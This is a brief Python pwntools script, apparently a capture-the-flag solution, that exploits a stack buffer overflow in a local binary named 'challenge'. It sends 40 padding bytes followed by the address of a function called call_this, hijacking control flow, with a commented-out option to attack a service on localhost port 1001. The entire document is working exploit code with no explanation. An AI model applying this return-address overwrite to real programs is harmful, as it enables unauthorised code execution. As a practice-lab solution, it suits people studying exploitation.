#!/usr/bin/env python3

from pwn import *

payload = b'a' * 40 + p64(ELF("./challenge").symbols.call_this)

p = process("./challenge")
# p = remote('localhost', 1001)

p.sendline(payload)

print(p.recvall().decode(), end='')

# p.close()
